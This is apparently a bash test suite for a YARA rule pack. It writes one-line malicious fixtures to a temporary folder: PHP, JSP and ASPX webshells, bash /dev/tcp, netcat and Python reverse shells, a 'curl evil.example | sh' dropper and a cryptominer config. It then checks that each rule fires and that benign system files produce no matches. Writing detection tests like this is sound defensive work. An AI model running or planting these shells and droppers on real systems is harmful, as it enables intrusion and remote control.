#!/usr/bin/env bash
# run-yara.tests.sh - test the Halkyn YARA starter pack
# =====================================================
# Asserts every rule fires on a matching malicious fixture (true positives) and
# that a benign corpus of real system files produces ZERO matches (no false
# positives). Requires a YARA engine (yara-python preferred, or the yara CLI);
# if neither is present the suite reports skipped and passes.
# Usage:  ./run-yara.tests.sh [path-to-run-yara.sh]

set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
RUNNER="${1:-$HERE/run-yara.sh}"
RULES="$HERE/rules"
WORK="$(mktemp -d)"
PASS=0; FAIL=0
trap 'rm -rf "$WORK"' EXIT
ok()  { PASS=$((PASS + 1)); printf '  ok   - %s\n' "$1"; }
bad() { FAIL=$((FAIL + 1)); printf '  FAIL - %s\n' "$1"; }

if ! python3 -c "import yara" 2>/dev/null && ! command -v yara >/dev/null 2>&1; then
    printf 'no YARA engine available - skipping (install yara-python or yara CLI)\n'
    exit 0
fi

# --- malicious fixtures, one per rule -------------------------------------
mkdir -p "$WORK/mal"
printf '<?php eval($_POST["x"]); ?>\n'                              > "$WORK/mal/a.php"
printf '<?php eval(base64_decode("ZWNobyAxOw==")); ?>\n'           > "$WORK/mal/b.php"
printf '<%% Runtime.getRuntime().exec(request.getParameter("c")); %%>\n' > "$WORK/mal/c.jsp"
printf '<%%@ Page Language="C#" %%><%% System.Diagnostics.Process.Start("cmd.exe", Request["cmd"]); %%>\n' > "$WORK/mal/d.aspx"
printf 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n'                  > "$WORK/mal/rev.sh"
printf 'nc -e /bin/sh 10.0.0.1 4444\n'                             > "$WORK/mal/nc.sh"
printf 'curl http://evil.example/x.sh | sh\n'                      > "$WORK/mal/drop.sh"
printf 'import socket,os,pty\ns=socket.socket()\nos.dup2(s.fileno(),0)\npty.spawn("/bin/sh")\n' > "$WORK/mal/rev.py"
printf '{"pool":"stratum+tcp://p:3333"}\nxmrig --donate-level 1\n' > "$WORK/mal/miner.conf"

printf 'Test 1: true positives (every malicious fixture flagged)\n'
"$RUNNER" -o "$WORK/omal" "$WORK/mal" >/dev/null 2>&1
rc=$?
F="$WORK/omal/findings.tsv"
[ "$rc" -eq 1 ] && ok "malicious tree exits 1" || bad "malicious tree exit $rc, want 1"
flagged=$(awk -F'\t' 'NR>1{print $4}' "$F" 2>/dev/null | sort -u | wc -l)
[ "$flagged" -eq 9 ] && ok "all 9 fixtures flagged" || bad "only $flagged/9 fixtures flagged"
for r in HALKYN_Webshell_PHP_Eval_Request HALKYN_Webshell_PHP_Obfuscated \
         HALKYN_Webshell_JSP_Exec HALKYN_Webshell_ASPX_Exec \
         HALKYN_Revshell_DevTCP HALKYN_Revshell_Toolset \
         HALKYN_Dropper_FetchPipeShell HALKYN_Miner_Cryptonight; do
    grep -q "$r" "$F" && ok "$r fired" || bad "$r did not fire"
done

# --- benign corpus: real system files -------------------------------------
printf 'Test 2: no false positives on a benign corpus\n'
mkdir -p "$WORK/benign"
# real python stdlib modules that contain socket/dup2/import (the FP hazard)
for m in socket subprocess os asyncio; do
    cp /usr/lib/python3.*/"$m".py "$WORK/benign/" 2>/dev/null || true
done
# real shell scripts from the system
find /usr/bin /bin -maxdepth 1 -type f 2>/dev/null | head -60 | while read -r f; do
    head -c 8000 "$f" > "$WORK/benign/$(basename "$f").sample" 2>/dev/null || true
done
# benign web-ish files: request input but no exec; download but not piped to shell
printf '<?php echo htmlspecialchars($_GET["q"]); ?>\n'  > "$WORK/benign/tpl.php"
printf 'function f(){return JSON.parse(x);} // eval of ideas\n' > "$WORK/benign/app.js"
printf '#!/bin/sh\ncurl -o /tmp/pkg https://get.example/pkg\nchmod 0644 /tmp/pkg\n' > "$WORK/benign/install.sh"
"$RUNNER" -o "$WORK/oben" "$WORK/benign" >/dev/null 2>&1
rc=$?
n=$(awk 'NR>1' "$WORK/oben/findings.tsv" 2>/dev/null | wc -l)
[ "$n" -eq 0 ] && ok "zero false positives ($n)" || {
    bad "benign corpus produced $n match(es):"
    awk -F'\t' 'NR>1{print "      "$4" "$6}' "$WORK/oben/findings.tsv"
}
[ "$rc" -eq 0 ] && ok "benign tree exits 0" || bad "benign tree exit $rc, want 0"

printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
